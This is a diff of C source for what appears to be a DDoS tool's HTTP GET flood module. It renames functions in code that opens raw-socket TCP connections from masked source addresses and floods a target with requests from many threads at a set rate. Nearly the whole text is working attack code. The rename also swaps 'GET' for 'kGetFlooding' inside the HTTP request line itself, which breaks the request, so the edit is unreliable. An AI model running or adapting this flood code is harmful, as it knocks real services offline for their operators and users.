@@ -5,7 +5,7 @@
 #include "base/time_check.h"
 #include "ddos/get_flood.h"
 
-#define GET_METHOD "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
+#define kGetFlooding_METHOD "kGetFlooding / HTTP/1.1\r\nHost: localhost\r\n\r\n"
 
 extern int g_num_threads;
 
@@ -25,9 +25,9 @@ pthread_cond_t g_get_cond = PTHREAD_COND_INITIALIZER;
 struct timespec g_get_before_time;
 struct timespec g_get_now_time;
 // request msg
-char g_get_request_msg[__GET_REQUEST_MSG_SIZE__ ];
+char g_get_request_msg[__kGetFlooding_REQUEST_MSG_SIZE__ ];
 
-void get_flood_print_usage(void)
+void GetFloodPrintUsage(void)
 {
 	printf(
 			"get flood Usage : "
@@ -35,7 +35,7 @@ void get_flood_print_usage(void)
 	return;
 }
 
-void *generate_get_flood(void *data)
+void *GenerateGetFlood(void *data)
 {
 	srand(time(NULL));
 	int thread_id = *((int*) data);
@@ -49,10 +49,10 @@ void *generate_get_flood(void *data)
 			pthread_cond_wait(&g_get_cond, &g_get_mutex);
 		}
 		// get now resource
-		get_masking_arguments(&g_get_input, &g_get_now);
+		GetMaskingArguments(&g_get_input, &g_get_now);
 		// make and do tcp connection using raw socket
 		int src_port, seq, ack;
-		int sock = tcp_make_connection(
+		int sock = MakeTcpConnection(
 				inet_addr(g_get_now.src),
 				inet_addr(g_get_now.dest),
 				&src_port,
@@ -60,20 +60,20 @@ void *generate_get_flood(void *data)
 				&seq,
 				&ack,
 				0);
-		// send HTTP GET method
-		tcp_socket_send_data(
+		// send HTTP kGetFlooding method
+		TcpSocketSendData(
 				sock,
 				inet_addr(g_get_now.src),
 				inet_addr(g_get_now.dest),
 				src_port,
 				g_get_now.port,
-				GET_METHOD,
-				strlen(GET_METHOD),
+				kGetFlooding_METHOD,
+				strlen(kGetFlooding_METHOD),
 				seq,
 				ack,
 				0);
 		// time checking
-		time_check(
+		TimeCheck(
 				&g_get_cond,
 				&g_get_before_time,
 				&g_get_now_time,
@@ -88,11 +88,11 @@ void *generate_get_flood(void *data)
 	return NULL;
 }
 
-void *get_flood_time_check(void *data)
+void *GetFloodTimeCheck(void *data)
 {
 	while (1) {
 		pthread_mutex_lock(&g_get_mutex);
-		time_check(
+		TimeCheck(
 				&g_get_cond,
 				&g_get_before_time,
 				&g_get_now_time,
@@ -102,19 +102,19 @@ void *get_flood_time_check(void *data)
 	return NULL;
 }
 
-void get_flood_main(char *argv[])
+void GetFloodMain(char *argv[])
 {
-	strcpy(g_get_request_msg, GET_METHOD);
+	strcpy(g_get_request_msg, kGetFlooding_METHOD);
 	printf("Requesting: \n%s\n", g_get_request_msg);
 	int argc = 0;
 	while (argv[argc] != NULL) {
 		argc++;
 	}
 	if (argc != 4) {
-		get_flood_print_usage();
+		GetFloodPrintUsage();
 		return;
 	}
-	argv_to_input_arguments(argv, &g_get_input);
+	ArgvToInputArguments(argv, &g_get_input);
 	g_get_num_generated_in_sec = 0;
 	g_get_num_total = 0;
 	memset(&g_get_before_time, 0, sizeof(struct timespec));
@@ -126,23 +126,23 @@ void get_flood_main(char *argv[])
 	for (int i = 0; i < num_threads; i++) {
 		thread_ids[i] = i;
 	}
-	printf("Sending GET requests to %s using %d threads %u per sec\n",
+	printf("Sending kGetFlooding requests to %s using %d threads %u per sec\n",
 			g_get_input.dest, num_threads, g_get_request_per_sec);
 	int i;
 	for (i = 0; i < num_threads; i++) {
 		pthread_create(
 				&threads[i],
 				NULL,
-				generate_get_flood,
+				GenerateGetFlood,
 				(void *)&thread_ids[i]);
 	}
-	pthread_create(&threads[i], NULL, get_flood_time_check, NULL);
+	pthread_create(&threads[i], NULL, GetFloodTimeCheck, NULL);
 	for (int i = 0; i < num_threads; i++) {
 		pthread_join(threads[i], NULL);
 		printf("threads %d joined\n", i);
 	}
 	pthread_mutex_destroy(&g_get_mutex);
-	printf("GET flood finished\nTotal %lu packets sent.\n", g_get_num_total);
+	printf("kGetFlooding flood finished\nTotal %lu packets sent.\n", g_get_num_total);
 	pthread_exit(NULL);
 	return;
 }
